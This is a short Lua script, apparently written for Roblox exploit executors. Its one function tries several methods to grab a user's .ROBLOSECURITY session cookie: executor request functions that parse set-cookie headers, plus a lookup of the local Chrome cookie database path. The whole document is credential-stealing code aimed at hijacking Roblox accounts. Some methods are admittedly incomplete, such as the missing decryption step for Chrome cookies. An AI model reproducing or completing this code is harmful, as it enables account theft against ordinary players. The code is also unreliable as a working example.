-- Try to grab .ROBLOSECURITY cookie using executor functions
local function attemptCookieGrab()
    -- Method 1: Try syn.request (Synapse X)
    if syn and syn.request then
        local cookies = syn.request({
            Url = "https://www.roblox.com/home",
            Method = "GET"
        }).Headers["set-cookie"] or ""
        
        for cookie in cookies:gmatch("[^;]+") do
            if cookie:match("%.ROBLOSECURITY") then
                return cookie:match("%.ROBLOSECURITY=([^;]+)")
            end
        end
    end
    
    -- Method 2: Try reading Chrome cookie file (some executors expose readfile)
    if readfile and isfile then
        local cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        if isfile(cookiePath) then
            -- Note: Cookie DB is encrypted, this is simplified
            -- Real implementation would need decryption
            return "Cookie file found at: " .. cookiePath
        end
    end
    
    -- Method 3: Try request with current session (works on most executors)
    if request then
        local response = request({
            Url = "https://users.roblox.com/v1/users/authenticated",
            Method = "GET"
        })
        if response.Headers and response.Headers["set-cookie"] then
            local cookies = response.Headers["set-cookie"]
            for cookie in cookies:gmatch("[^;]+") do
                if cookie:match("%.ROBLOSECURITY") then
                    return cookie:match("%.ROBLOSECURITY=([^;]+)")
                end
            end
        end
    end
    
    -- Method 4: http_request (Fluxus, others)
    if http_request then
        local response = http_request({
            Url = "https://www.roblox.com/home",
            Method = "GET"
        })
        if response.Cookies then
            return response.Cookies[".ROBLOSECURITY"]
        end
    end
    
    return "Executor doesn't support cookie extraction"
end

